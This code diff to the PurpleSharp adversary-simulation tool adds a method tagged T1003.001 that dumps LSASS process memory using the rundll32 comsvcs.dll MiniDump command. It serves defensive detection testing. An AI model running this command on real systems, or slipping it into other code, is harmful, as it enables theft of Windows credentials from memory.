@@ -183,10 +183,10 @@ namespace PurpleSharp.Simulations
             }
 
         }
-        public static void LsassMemoryDump(string log)
+        public static void LsassMemoryDumpWinApi(string log)
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
-            Lib.Logger logger = new Lib.Logger(currentPath + log);
+            Logger logger = new Logger(currentPath + log);
             logger.SimulationHeader("T1003.001");
             try
             {
@@ -194,6 +194,24 @@ namespace PurpleSharp.Simulations
                 logger.SimulationFinished();
             }
             catch(Exception ex)
+            {
+                logger.SimulationFailed(ex);
+            }
+        }
+
+        public static void LsassMemoryDumpRundll32(string log)
+        {
+            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
+            Logger logger = new Logger(currentPath + log);
+            logger.SimulationHeader("T1003.001");
+            try
+            {
+                Process proc = Process.GetProcessesByName("lsass")[0];
+                logger.TimestampInfo(String.Format("Process {0}.exe with PID:{1}", proc.ProcessName, proc.Id));
+                ExecutionHelper.StartProcessApi("", String.Format("rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump {0} lsass.dmp full", proc.Id), logger);
+                logger.SimulationFinished();
+            }
+            catch (Exception ex)
             {
                 logger.SimulationFailed(ex);
             }
